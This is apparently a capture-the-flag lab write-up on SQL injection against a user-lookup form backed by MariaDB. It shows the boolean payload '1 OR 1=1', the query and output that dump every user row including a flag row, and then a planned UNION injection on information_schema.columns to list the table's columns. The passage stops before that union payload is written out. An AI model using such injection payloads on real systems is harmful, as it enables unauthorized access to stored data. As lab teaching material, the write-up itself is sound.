Steps:
1. Typing 1 gives us the result:

ID: 1
First name: one
Surname : me

So, we can see that the approximate SQL-query is
SELECT firts_name, last_name FROM users WHERE user_id = 1;

2. Then we try to use the simplest SQL-injection (boolean injection):

1 OR 1=1

It means that SQL code now is

SELECT firts_name, last_name FROM users WHERE user_id = 1 OR 1=1;

This query returns all the rows form the table with users. since OR 1=1 is always true. So the output is:

ID: 1 OR 1=1 
First name: one
Surname : me

ID: 1 OR 1=1 
First name: two
Surname : me

ID: 1 OR 1=1 
First name: three
Surname : me

ID: 1 OR 1=1 
First name: Flag
Surname : GetThe

As we can see, there are 4 rows, the last one is a trick for the flag catching. 

3. As we try to exploit the database, it is expected that there are some other columns, not only those we can see when typing in a provided form. Typing any symbol gives us the error of MariaDB. Every MariaDB database managment system contains table called information_schema.columns that lists metadata of every column in every table in a database. So we can use this information to know the exact names in our users table.
To do so we will use the union injection that comes from query:

SELECT column_name, table_name
FROM information_schema.columns
WHERE table_name = 'users';